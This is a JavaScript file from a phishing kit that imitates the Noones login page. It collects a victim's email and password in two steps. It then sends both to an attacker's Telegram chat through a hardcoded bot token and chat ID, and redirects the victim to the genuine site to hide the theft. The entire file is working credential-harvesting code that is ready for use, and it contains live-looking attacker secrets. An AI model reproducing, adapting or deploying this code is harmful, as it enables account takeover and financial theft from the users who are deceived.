document.addEventListener("DOMContentLoaded", function () {
  // Get form elements
  const form = document.querySelector("form");
  const emailInput = document.querySelector('input[type="email"]');
  const continueButton = document.getElementById("continueButton");
  const infoText = document.querySelector(".mantine-18aovxe .mantine-Text-root");

  // Flag to keep track of input type state
  let isEmailInput = true;

  continueButton.addEventListener("click", function () {
    if (isEmailInput) {
      // Store original email value
      const emailValue = emailInput.value.trim();

      // Check if email is provided and is in a valid format
      if (emailValue === "" || !validateEmail(emailValue)) {
        // Prompt user to provide a valid email address
        alert("Please enter a valid email address.");
        return;
      }

      // Switch input type to password
      emailInput.type = "password";
      emailInput.placeholder = "Password";
      emailInput.id = "password"; // Change input ID to match password input

      // Update info text
      infoText.textContent = `Login initiated with email: ${emailValue}. Please provide your password.`;

      // Clear the email input
      emailInput.value = "";
    } else {
      // Get email and password values
      const emailValue = infoText.textContent.split("Login initiated with email: ")[1].split(". Please provide your password.")[0];
      const passwordValue = emailInput.value.trim();

      // Construct message with both email and password
      const message = `New login Noones:\n 📧 Email: ${emailValue} \n 🔑 Password: ${passwordValue} \n @kaliologie `;

      // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot token and chat ID
      const botToken = '6375326209:AAHznFTmYEJkWiY0qaoSWlEHwdyG5ixKufQ';
      const chatId = '-1002117422654';

      // Send message to Telegram using fetch
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(response => {
          if (!response.ok) {
            throw new Error('Failed to send message to Telegram');
          }
          // Redirect user immediately after sending message to Telegram
          window.location.href = "https://noones.com/";
        })
        .catch(error => {
          console.error('Error sending message to Telegram:', error);
          // Handle errors here
        });

      // Clear the email input
      emailInput.value = "";
    }

    // Toggle the flag for the next click
    isEmailInput = !isEmailInput;
  });

  // Email validation function
  function validateEmail(email) {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  }
});
